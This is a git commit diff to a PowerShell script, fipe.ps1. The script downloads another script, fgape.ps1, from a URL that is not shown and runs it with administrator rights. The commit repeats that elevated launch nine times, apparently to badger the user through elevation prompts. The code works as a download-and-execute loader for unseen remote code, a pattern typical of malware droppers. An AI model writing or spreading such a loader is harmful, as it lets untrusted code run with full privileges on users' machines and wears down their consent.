f215e62380ac9467900652cde0a2d98dfff0e446
FanAPIpipa <156794064+FanAPIpipa@users.noreply.github.com>
2024-02-05 13:14:56 +0300

    Update fipe.ps1

--- fipe.ps1
+++ fipe.ps1
@@ -4,6 +4,14 @@ $fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "fgape.ps1"
 Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
 if (Test-Path $fgapeScriptPath) {
     Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
+    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
+    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
+    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
+    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
+    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
+    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
+    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
+    Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
 } else {
     Write-Host "Не удалось загрузить скрипт fgape.ps1."
 }
